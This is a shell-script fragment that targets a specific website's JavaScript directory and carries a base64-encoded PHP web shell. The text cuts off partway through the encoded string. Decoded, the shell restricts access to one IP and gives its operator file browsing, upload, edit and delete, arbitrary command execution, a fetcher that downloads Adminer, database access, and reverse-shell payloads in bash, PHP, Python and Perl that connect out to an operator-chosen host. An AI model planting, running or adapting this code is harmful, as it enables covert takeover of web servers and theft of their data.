miuae="dirnya="/home/u477812530/domains/escortsdehradun.com/public_html/js/"
datanya="PD9waHAKc2Vzc2lvbl9zdGFydCgpOwovLyBBdXRob3IgYnkgeW91cmRyZTRtNwovLyBSZWNvZGUgdGFucGEgaXppbj8gTm9vYiBhbmplbmcgd2t3awovLyBXSElURUxJU1QgSVAKJHdoaXRlbGlzdCA9IFsnMTg1LjIxMy44My4yNSddOyAvLyBHYW50aSBkZW5nYW4gSVAgeWFuZyBkaWl6aW5rYW4KJGlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CmlmICghaW5fYXJyYXkoJGlwLCAkd2hpdGVsaXN0KSkgewogICAgaGVhZGVyKCdIVFRQLzEuMSA0MDMgRm9yYmlkZGVuJyk7CiAgICBkaWUoIgo8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogICAgPHRpdGxlPjQwMyBGb3JiaWRkZW48L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKICAgICAgICAgICAgY29sb3I6cmdiKDI1NSwgMCwgMCk7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgcGFkZGluZzogNTBweDsKICAgICAgICB9CiAgICAgICAgaW1nIHsKICAgICAgICAgICAgd2lkdGg6IDE1MHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAxMHB4OwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgMTBweHJnYigyNTUsIDAsIDApOwogICAgICAgIH0KICAgICAgICAuYXNjaWkgewogICAgICAgICAgICB3aGl0ZS1zcGFjZTogcHJlOwogICAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgfQogICAgICAgIC5mb290ZXIgewogICAgICAgICAgICBtYXJnaW4tdG9wOiAyMHB4OwogICAgICAgICAgICBjb2xvcjogZ3JheTsKICAgICAgICAgICAgZm9udC1zaXplOiAxMnB4OwogICAgICAgIH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8aW1nIHNyYz0naHR0cHM6Ly9waG9uZWt5LmNvLnVrL3RodW1icy9zY3JlZW5zYXZlcnMvZG93bi9mYW50YXN5L2JsaW5reWV5ZXNfNXRuMzF5c24uZ2lmJyB3aWR0aD0nMjUwcHgnIGhlaWdodD0nMjUwcHgnIC8+CiAgICA8cCBzdHlsZT0nbWFyZ2luLXRvcDoyMHB4O2ZvbnQtc2l6ZToxOHB4Oyc+NDAzIEFjY2VzcyBEZW5pZWQgLSBZb3VyIElQIE5vdCBXaGl0ZWxpc3Q8L3A+CiAgICA8cD5DaWUuLi4gTWF1IG55a3VuZyBha3NlcyB5YT8gd2t3ayDwn6StPC9wPgogICAgPGRpdiBjbGFzcz0nZm9vdGVyJz4tIHlvdXJkcmU0bTcgLSA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+CiIpOwoKfQovLyA9PT0gVEVNUExBVEUgVUkgPT09IC8vCmZ1bmN0aW9uIGhlYWQoJHRpdGxlID0gIldlYlNoZWxsIikgewogICAgZWNobyA8PDxIVE1MCjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+JHRpdGxlPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsgYmFja2dyb3VuZDogcmdiKDAsIDAsIDApOyBjb2xvcjogI2VlZTsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgcGFkZGluZzogMjBweDsgfQogICAgICAgIC5tZW51IHsgZGlzcGxheTogZmxleDsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7IGdhcDogMTBweDsgbWFyZ2luLWJvdHRvbTogMjBweDsgZmxleC13cmFwOiB3cmFwOyB9CiAgICAgICAgYSwgaW5wdXRbdHlwZT1zdWJtaXRdIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzIyMjsgY29sb3I6ICNmZmY7IGJvcmRlcjogMXB4IHNvbGlkICM0NDQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweCAxMnB4OyBib3JkZXItcmFkaXVzOiA1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICB9CiAgICAgICAgYTpob3ZlciwgaW5wdXRbdHlwZT1zdWJtaXRdOmhvdmVyIHsgYmFja2dyb3VuZDogIzMzMzsgfQogICAgICAgIGlucHV0W3R5cGU9dGV4dF0sIHRleHRhcmVhIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzFlMWUxZTsgY29sb3I6ICNmZmY7IGJvcmRlcjogMXB4IHNvbGlkICM0NDQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweDsgd2lkdGg6IDEwMCU7IG1heC13aWR0aDogNjAwcHg7CiAgICAgICAgfQogICAgICAgIHRhYmxlIHsgd2lkdGg6IDEwMCU7IGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7IH0KICAgICAgICB0aCwgdGQgeyBwYWRkaW5nOiA4cHg7IGJvcmRlci1ib3R0b206IDFweCBzb2xpZCAjMzMzOyB0ZXh0LWFsaWduOiBsZWZ0OyB9CiAgICAgICAgdGggeyBiYWNrZ3JvdW5kOiAjMjIyOyB9CiAgICAgICAgcHJlIHsgYmFja2dyb3VuZDogIzFlMWUxZTsgcGFkZGluZzogMTBweDsgYm9yZGVyLXJhZGl1czogNXB4OyB3aGl0ZS1zcGFjZTogcHJlLXdyYXA7IH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CkhUTUw7Cn0KCmZ1bmN0aW9uIGZvb3RlcigpIHsKICAgIGVjaG8gIjxjZW50ZXI+PGhyPjxzbWFsbD5Zb3VyIElQIDogeyRfU0VSVkVSWydSRU1PVEVfQUREUiddfSB8IEhvc3QgOiAiLmdldGhvc3RuYW1lKCkuIiB8ICIuZGF0ZSgiWS1tLWQgSDppOnMiKS4iPC9zbWFsbD48L2JvZHk+PC9odG1sPjwvY2VudGVyPjxjZW50ZXI+PHNtYWxsPj4+IEF1dGhvciBieSA6IHlvdXJkcmU0bTcgPDw8YnI+Pj4gR2l0aHViIDogZ2l0aHViLmNvbS9JdHNNZUFsZjQwNCA8PDwvY2VudGVyPjwvYnI+PC9zbWFsbD4iOwp9CgovLyA9PT0gRklMRSBNQU5BR0VSID09PSAvLwppZiAoaXNzZXQoJF9HRVRbJ2ZtJ10pKSB7CiAgICBoZWFkKCJGaWxlIE1hbmFnZXIiKTsKICAgICRwYXRoID0gaXNzZXQoJF9HRVRbJ3BhdGgnXSkgPyAkX0dFVFsncGF0aCddIDogJy4nOwogICAgJHJlYWwgPSByZWFscGF0aCgkcGF0aCk7CiAgICBpZiAoIWlzX2RpcigkcmVhbCkpIHsKICAgICAgICBlY2hvICI8cD5JbnZhbGlkIHBhdGg8L3A+IjsgZm9vdGVyKCk7IGV4aXQ7CiAgICB9CgogICAgZWNobyAiPGgyPvCfk4EgRmlsZSBNYW5hZ2VyOiAkcmVhbDwvaDI+IjsKICAgIGVjaG8gIjx0YWJsZT48dHI+PHRoPlR5cGU8L3RoPjx0aD5OYW1lPC90aD48dGg+U2l6ZTwvdGg+PHRoPk1vZGlmaWVkPC90aD48dGg+QWN0aW9uPC90aD48L3RyPiI7CgogICAgZm9yZWFjaCAoc2NhbmRpcigkcmVhbCkgYXMgJGYpIHsKICAgICAgICBpZiAoJGYgPT09ICIuIikgY29udGludWU7CiAgICAgICAgJGZ1bGwgPSAkcmVhbCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkZjsKICAgICAgICAkdHlwZSA9IGlzX2RpcigkZnVsbCkgPyAiRElSIiA6ICJGSUxFIjsKICAgICAgICAkc2l6ZSA9IGlzX2ZpbGUoJGZ1bGwpID8gZmlsZXNpemUoJGZ1bGwpIC4gIiBCIiA6ICItIjsKICAgICAgICAkdGltZSA9IGRhdGUoIlktbS1kIEg6aSIsIGZpbGVtdGltZSgkZnVsbCkpOwogICAgICAgICRlbmMgPSB1cmxlbmNvZGUoJGZ1bGwpOwoKICAgICAgICBlY2hvICI8dHI+PHRkPiR0eXBlPC90ZD48dGQ+IjsKICAgICAgICBlY2hvICR0eXBlID09PSAiRElSIiA/ICI8YSBocmVmPSc/Zm09MSZwYXRoPSRlbmMnPiRmPC9hPiIgOiBodG1sc3BlY2lhbGNoYXJzKCRmKTsKICAgICAgICBlY2hvICI8L3RkPjx0ZD4kc2l6ZTwvdGQ+PHRkPiR0aW1lPC90ZD48dGQ+IjsKICAgICAgICBpZiAoJHR5cGUgPT09ICJGSUxFIikgewogICAgICAgICAgICBlY2hvICI8YSBocmVmPSc/ZGw9JGVuYyc+RG93bmxvYWQ8L2E+ICI7CiAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9Jz9lZGl0PSRlbmMnPkVkaXQ8L2E+ICI7CiAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9Jz9kZWw9JGVuYycgb25jbGljaz1cInJldHVybiBjb25maXJtKCdEZWxldGU/JylcIj5EZWxldGU8L2E+IjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICI8YSBocmVmPSc/Zm09MSZwYXRoPSRlbmMnPk9wZW48L2E+IjsKICAgICAgICB9CiAgICAgICAgZWNobyAiPC90ZD48L3RyPiI7CiAgICB9CgogICAgZWNobyAiPC90YWJsZT48YnI+PGEgaHJlZj0nPyc+QkFDSyBUTyBNRU5VPC9hPiI7IGZvb3RlcigpOyBleGl0Owp9CgovLyA9PT0gRE9XTkxPQUQgRklMRSA9PT0gLy8KaWYgKGlzc2V0KCRfR0VUWydkbCddKSAmJiBmaWxlX2V4aXN0cygkX0dFVFsnZGwnXSkpIHsKICAgICRmID0gJF9HRVRbJ2RsJ107CiAgICBoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyk7CiAgICBoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInLmJhc2VuYW1lKCRmKS4nIicpOwogICAgcmVhZGZpbGUoJGYpOyBleGl0Owp9CgovLyA9PT0gREVMRVRFIEZJTEUgPT09IC8vCmlmIChpc3NldCgkX0dFVFsnZGVsJ10pICYmIGZpbGVfZXhpc3RzKCRfR0VUWydkZWwnXSkpIHsKICAgIHVubGluaygkX0dFVFsnZGVsJ10pOwogICAgaGVhZGVyKCJMb2NhdGlvbjogP2ZtPTEiKTsgZXhpdDsKfQoKLy8gPT09IEVESVQgRklMRSA9PT0gLy8KaWYgKGlzc2V0KCRfR0VUWydlZGl0J10pICYmIGZpbGVfZXhpc3RzKCRfR0VUWydlZGl0J10pKSB7CiAgICAkZmlsZSA9ICRfR0VUWydlZGl0J107CiAgICBoZWFkKCJFZGl0IEZpbGUiKTsKICAgIGlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSB7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRfUE9TVFsnY29udGVudCddKTsKICAgICAgICBlY2hvICI8cD7inIUgRmlsZSBkaXNpbXBhbiE8L3A+IjsKICAgIH0KICAgICRjb250ZW50ID0gaHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkZmlsZSkpOwogICAgZWNobyAiPGgyPvCfk50gRWRpdDogIi5odG1sc3BlY2lhbGNoYXJzKCRmaWxlKS4iPC9oMj4KICAgIDxmb3JtIG1ldGhvZD0ncG9zdCc+CiAgICAgICAgPHRleHRhcmVhIG5hbWU9J2NvbnRlbnQnIHJvd3M9JzIwJz4kY29udGVudDwvdGV4dGFyZWE+PGJyPgogICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdTaW1wYW4nPgogICAgPC9mb3JtPgogICAgPGEgaHJlZj0nP2ZtPTEnPkJBQ0sgVE8gTUVOVTwvYT4iOwogICAgZm9vdGVyKCk7IGV4aXQ7Cn0KCi8vID09PSBQSFAgSU5GTyBWSUVXRVIgPT09IC8vCmlmIChpc3NldCgkX0dFVFsnaW5mbyddKSkgewogICAgaGVhZCgiUEhQIEluZm8iKTsKICAgIGVjaG8gIjxoMj7ihLnvuI8gUEhQIEluZm88L2gyPiI7CiAgICBvYl9zdGFydCgpOwogICAgcGhwaW5mbygpOwogICAgJGluZm8gPSBvYl9nZXRfY2xlYW4oKTsKCiAgICAkaW5mbyA9IHByZWdfcmVwbGFjZSgnLzxzdHlsZVtePl0qPi4qPzxcL3N0eWxlPi9pcycsICcnLCAkaW5mbyk7CiAgICAkaW5mbyA9IHN0cl9yZXBsYWNlKCc8Ym9keT4nLCAnPGRpdiBzdHlsZT0idGV4dC1hbGlnbjpsZWZ0O2JhY2tncm91bmQ6IzFlMWUxZTtjb2xvcjojZWVlO3BhZGRpbmc6MjBweDtmb250LWZhbWlseTptb25vc3BhY2U7Ij4nLCAkaW5mbyk7CiAgICAkaW5mbyA9IHN0cl9yZXBsYWNlKCc8L2JvZHk+JywgJzwvZGl2PicsICRpbmZvKTsKICAgIGVjaG8gJGluZm87CgogICAgZm9vdGVyKCk7IGV4aXQ7Cn0KCi8vID09PSBBRE1JTkVSID09PSAvLwppZiAoaXNzZXQoJF9HRVRbJ2FkbWluZXInXSkpIHsKICAgIGhlYWQoIkFkbWluZXIiKTsKICAgIGVjaG8gIjxoMj7wn6epIEFkbWluZXIgREIgTWFuYWdlcjwvaDI+CiAgICA8cD5TaWxha2FuIHBpbGloIHZlcnNpIEFkbWluZXIgeWFuZyBpbmdpbiBkaWd1bmFrYW46PC9wPgogICAgPHVsPgogICAgICAgIDxsaT48YSBocmVmPSc/YWRtaW5lcl9kbCc+4p6h77iPIERvd25sb2FkICYgSmFsYW5rYW4gQWRtaW5lciAoU1FMaXRlL015U1FMKTwvYT48L2xpPgogICAgICAgIDxsaT48YSBocmVmPSc/Jz5CQUNLIFRPIE1FTlU8L2E+PC9saT4KICAgIDwvdWw+IjsKICAgIGZvb3RlcigpOyBleGl0Owp9CgovLyA9PT0gQVVUTyBET1dOTE9BRCBBRE1JTkVSID09PSAvLwppZiAoaXNzZXQoJF9HRVRbJ2FkbWluZXJfZGwnXSkpIHsKICAgICRhZG1pbmVyX3VybCA9ICdodHRwczovL3d3dy5hZG1pbmVyLm9yZy9sYXRlc3QucGhwJzsKICAgICRzYXZlX2FzID0gJ2FkbWluZXIucGhwJzsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRzYXZlX2FzLCBmaWxlX2dldF9jb250ZW50cygkYWRtaW5lcl91cmwpKTsKICAgIGhlYWRlcigiTG9jYXRpb246ICRzYXZlX2FzIik7CiAgICBleGl0Owp9Ci8vID09PSBVUExPQUQgRklMRSA9PT0gLy8KaWYgKGlzc2V0KCRfR0VUWyd1cCddKSkgewogICAgaGVhZCgiVXBsb2FkIEZpbGUiKTsKICAgIGVjaG8gIjxoMj7wn5OkIFVwbG9hZCBGaWxlPC9oMj4KICAgIDxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+CiAgICAgICAgPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J3VwbG9hZCc+PGJyPjxicj4KICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz4KICAgIDwvZm9ybT48YSBocmVmPSc/Jz5CQUNLIFRPIE1FTlU8L2E+IjsKICAgIGZvb3RlcigpOyBleGl0Owp9CmlmIChpc3NldCgkX0ZJTEVTWyd1cGxvYWQnXSkpIHsKICAgICRuYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sndXBsb2FkJ11bJ25hbWUnXSk7CiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZCddWyd0bXBfbmFtZSddLCAkbmFtZSkpIHsKICAgICAgICBlY2hvICI8cD7inIUgRmlsZSAkbmFtZSBiZXJoYXNpbCBkaXVwbG9hZCE8L3A+IjsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiPHA+4p2MIEdhZ2FsIHVwbG9hZC48L3A+IjsKICAgIH0KICAgIGVjaG8gIjxhIGhyZWY9Jz8nPkJBQ0sgVE8gTUVOVTwvYT4iOyBleGl0Owp9CgovLyA9PT0gVEVSTUlOQUwgPT09IC8vCmlmIChpc3NldCgkX0dFVFsnY21kJ10pKSB7CiAgICBoZWFkKCJUZXJtaW5hbCIpOwogICAgZWNobyAiPGgyPvCfkrsgVGVybWluYWwgQ29tbWFuZDwvaDI+CiAgICA8Zm9ybSBtZXRob2Q9J3Bvc3QnPgogICAgICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdjb21tYW5kJyBwbGFjZWhvbGRlcj0nd2hvYW1pJz4KICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nSmFsYW5rYW4nPgogICAgPC9mb3JtPiI7CgogICAgaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgIWVtcHR5KCRfUE9TVFsnY29tbWFuZCddKSkgewogICAgICAgICRjbWQgPSAkX1BPU1RbJ2NvbW1hbmQnXTsKICAgICAgICBlY2hvICI8aDM+8J+TpCBQZXJpbnRhaDogPGNvZGU+IiAuIGh0bWxzcGVjaWFsY2hhcnMoJGNtZCkgLiAiPC9jb2RlPjwvaDM+PHByZT4iOwoKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCJzaGVsbF9leGVjIikgJiYgIWluX2FycmF5KCJzaGVsbF9leGVjIiwgZXhwbG9kZSgnLCcsIGluaV9nZXQoImRpc2FibGVfZnVuY3Rpb25zIikpKSkgewogICAgICAgICAgICBlY2hvIHNoZWxsX2V4ZWMoJGNtZCk7CiAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygic3lzdGVtIikgJiYgIWluX2FycmF5KCJzeXN0ZW0iLCBleHBsb2RlKCcsJywgaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKSkpKSB7CiAgICAgICAgICAgIHN5c3RlbSgkY21kKTsKICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCJleGVjIikgJiYgIWluX2FycmF5KCJleGVjIiwgZXhwbG9kZSgnLCcsIGluaV9nZXQoImRpc2FibGVfZnVuY3Rpb25zIikpKSkgewogICAgICAgICAgICBleGVjKCRjbWQsICRvdXRwdXQpOyBlY2hvIGltcGxvZGUoIlxuIiwgJG91dHB1dCk7CiAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygicGFzc3RocnUiKSAmJiAhaW5fYXJyYXkoInBhc3N0aHJ1IiwgZXhwbG9kZSgnLCcsIGluaV9nZXQoImRpc2FibGVfZnVuY3Rpb25zIikpKSkgewogICAgICAgICAgICBwYXNzdGhydSgkY21kKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICLimqDvuI8gU2VtdWEgZnVuZ3NpIGVrc2VrdXNpIHBlcmludGFoIGRpbm9uYWt0aWZrYW4gZGkgc2VydmVyIGluaS4iOwogICAgICAgIH0KCiAgICAgICAgZWNobyAiPC9wcmU+IjsKICAgIH0KCiAgICBlY2hvICI8YSBocmVmPSc/Jz5CQUNLIFRPIE1FTlU8L2E+IjsKICAgIGZvb3RlcigpOyBleGl0Owp9CgovLyA9PT0gQkFDS0NPTk5FQ1QgPT09IC8vCmlmIChpc3NldCgkX0dFVFsnYmFja2Nvbm5lY3QnXSkpIHsKICAgIGhlYWQoIkJhY2tjb25uZWN0IC8gUmV2ZXJzZSBTaGVsbCIpOwogICAgZWNobyAiPGgyPvCflIEgUmV2ZXJzZSBTaGVsbDwvaDI+CiAgICA8Zm9ybSBtZXRob2Q9J3Bvc3QnPgogICAgICAgIElQIFRhcmdldDogPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2lwJyBwbGFjZWhvbGRlcj0nZXg6IDE5Mi4xNjguMS4xMCc+PGJyPjxicj4KICAgICAgICBQb3J0OiA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0ncG9ydCcgcGxhY2Vob2xkZXI9J2V4OiA0NDQ0Jz48YnI+PGJyPgogICAgICAgIDxsYWJlbD5QYXlsb2FkOjwvbGFiZWw+PGJyPgogICAgICAgIDxzZWxlY3QgbmFtZT0ncGF5bG9hZCc+CiAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9J2Jhc2gnPmJhc2g8L29wdGlvbj4KICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ncGhwJz5waHA8L29wdGlvbj4KICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ncHl0aG9uJz5weXRob248L29wdGlvbj4KICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ncGVybCc+cGVybDwvb3B0aW9uPgogICAgICAgIDwvc2VsZWN0Pjxicj48YnI+CiAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc2VuZCcgdmFsdWU9J0Nvbm5lY3QgTm93Jz4KICAgIDwvZm9ybT4iOwoKICAgIGlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSB7CiAgICAgICAgJGlwID0gJF9QT1NUWydpcCddOwogICAgICAgICRwb3J0ID0gJF9QT1NUWydwb3J0J107CiAgICAgICAgJHBheWxvYWQgPSAkX1BPU1RbJ3BheWxvYWQnXTsKICAgICAgICBlY2hvICI8aDM+8J+agCBNZW5qYWxhbmthbiByZXZlcnNlIHNoZWxsIGtlIDxjb2RlPiRpcDokcG9ydDwvY29kZT48L2gzPjxwcmU+IjsKCiAgICAgICAgJGNtZCA9ICcnOwogICAgICAgIHN3aXRjaCAoJHBheWxvYWQpIHsKICAgICAgICAgICAgY2FzZSAnYmFzaCc6CiAgICAgICAgICAgICAgICAkY21kID0gImJhc2ggLWkgPiYgL2Rldi90Y3AvJGlwLyRwb3J0IDA+JjEiOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ3BocCc6CiAgICAgICAgICAgICAgICAkY21kID0gInBocCAtciAnXCRzb2NrPWZzb2Nrb3BlbihcIiRpcFwiLCRwb3J0KTtleGVjKFwiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjNcIik7JyI7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAncHl0aG9uJzoKICAgICAgICAgICAgICAgICRjbWQgPSAicHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoXCIkaXBcIiwkcG9ydCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbXCIvYmluL3NoXCJdKSciOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ3BlcmwnOgogICAgICAgICAgICAgICAgJGNtZCA9ICJwZXJsIC1lICd1c2UgU29ja2V0O1wkaT1cIiRpcFwiO1wkcD0kcG9ydDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKFwidGNwXCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oXCRwLGluZXRfYXRvbihcJGkpKSkpe29wZW4oU1RESU4sXCI+JlNcIik7b3BlbihTVERPVVQsXCI+JlNcIik7b3BlbihTVERFUlIsXCI+JlNcIik7ZXhlYyhcIi9iaW4vc2ggLWlcIik7fTsnIjsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICAgICAgLy8gSmFsYW5rYW4gY29tbWFuZCAoamlrYSBzaGVsbF9leGVjIHRlcnNlZGlhKQogICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSkgewogICAgICAgICAgICBzaGVsbF9leGVjKCRjbWQpOwogICAgICAgICAgICBlY2hvICLinIUgQ29tbWFuZCBkaWtpcmltLiBDb2JhIGxpaGF0IGRpIGxpc3RlbmVyIEFuZGEuIjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICLinYwgc2hlbGxfZXhlYyB0aWRhayB0ZXJzZWRpYSBkaSBzZXJ2ZXIgaW5pLiI7CiAgICAgICAgfQoKICAgICAgICBlY2hvICI8L3ByZT48YSBocmVmPSc/Jz5CQUNLIFRPIE1FTlU8L2E+IjsKICAgIH0KCiAgICBmb290ZXIoKTsgZXhpdDsKfQoKLy8gPT09IFNZU1RFTSBJTkZPID09PQppZiAoaXNzZXQoJF9HRVRbJ3N5c2luZm8nXSkpIHsKICAgIGhlYWQoIlN5c3RlbSBJbmZvIik7CiAgICBlY2hvICI8aDI+8J+noCBTeXN0ZW0gSW5mbzwvaDI+PHByZT4iOwogICAgZWNobyAiSG9zdG5hbWU6ICIuZ2V0aG9zdG5hbWUoKS4iXG4iOwogICAgZWNobyAiT1M6ICIucGhwX3VuYW1lKCkuIlxuIjsKICAgIGVjaG8gIlBIUCBWZXJzaW9uOiAiLnBocHZlcnNpb24oKS4iXG4iOwogICAgZWNobyAiU2VydmVyIFNvZnR3YXJlOiAiLiRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXS4iXG4iOwogICAgZWNobyAiRG9jdW1lbnQgUm9vdDogIi4kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLiJcbiI7CiAgICBlY2hvICJDdXJyZW50IFVzZXI6ICIuZ2V0X2N1cnJlbnRfdXNlcigpLiJcbiI7CiAgICBlY2hvICJEaXNrIEZyZWU6ICIucm91bmQoZGlza19mcmVlX3NwYWNlKCIuIiApIC8gMTAyNCAvIDEwMjQsIDIpLiIgTUJcbiI7CiAgICBlY2hvICJEaXNrIFRvdGFsOiAiLnJvdW5kKGRpc2tfdG90YWxfc3BhY2UoIi4iICkgLyAxMDI0IC8gMTAyNCwgMikuIiBNQlxuIjsKICAgIGVjaG8gIlVwdGltZTogIi5Ac2hlbGxfZXhlYygndXB0aW1lJykuIlxuIjsKICAgIGVjaG8gIjwvcHJlPjxhIGhyZWY9Jz8nPkJBQ0sgVE8gTUVOVTwvYT4iOwogICAgZm9vdGVyKCk7CiAgICBleGl0Owp9CgovLyA9PT0gU1FMIE1BTkFHRVIgPT09IC8vCmlmIChpc3NldCgkX0dFVFsnc3FsbWdyJ10pKSB7CiAgICBoZWFkKCJTUUwgTWFuYWdlciIpOwogICAgZWNobyAiPGgyPvCfp64gU1FMIE1hbmFnZXI8L2gyPiI7CgogICAgaWYgKCFpc3NldCgkX1NFU1NJT05bJ3NxbF9jb25uZWN0ZWQnXSkpIHsKICAgICAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnPgogICAgICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdob3N0JyBwbGFjZWhvbGRlcj0nSG9zdCAoZXg6IGxvY2FsaG9zdCknPjxicj48YnI+CiAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3VzZXInIHBsYWNlaG9sZGVyPSdEQiBVc2VybmFtZSc+PGJyPjxicj4KICAgICAgICA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0ncGFzcycgcGxhY2Vob2xkZXI9J0RCIFBhc3N3b3JkJz48YnI+PGJyPgogICAgICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkYicgcGxhY2Vob2xkZXI9J0RhdGFiYXNlIE5hbWUnPjxicj48YnI+CiAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nY29ubmVjdCcgdmFsdWU9J0Nvbm5lY3QnPgogICAgICAgIDwvZm9ybT4iOwogICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ2Nvbm5lY3QnXSkpIHsKICAgICAgICAgICAgJGNvbm4gPSBAbXlzcWxpX2Nvbm5lY3QoJF9QT1NUWydob3N0J10sICRfUE9TVFsndXNlciddLCAkX1BPU1RbJ3Bhc3MnXSwgJF9QT1NUWydkYiddKTsKICAgICAgICAgICAgaWYgKCRjb25uKSB7CiAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3NxbF9jb25uZWN0ZWQnXSA9IHRydWU7CiAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3NxbF9ob3N0J10gPSAkX1BPU1RbJ2hvc3QnXTsKICAgICAgICAgICAgICAgICRfU0VTU0lPTlsnc3FsX3VzZXInXSA9ICRfUE9TVFsndXNlciddOwogICAgICAgICAgICAgICAgJF9TRVNTSU9OWydzcWxfcGFzcyddID0gJF9QT1NUWydwYXNzJ107CiAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3NxbF9kYiddICAgPSAkX1BPU1RbJ2RiJ107CiAgICAgICAgICAgICAgICBlY2hvICI8cD7inIUgQ29ubmVjdGVkIHRvIERCLjwvcD48bWV0YSBodHRwLWVxdWl2PSdyZWZyZXNoJyBjb250ZW50PScxO3VybD0/c3FsbWdyJz4iOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAiPHAgc3R5bGU9J2NvbG9yOnJlZDsnPuKdjCBDb25uZWN0aW9uI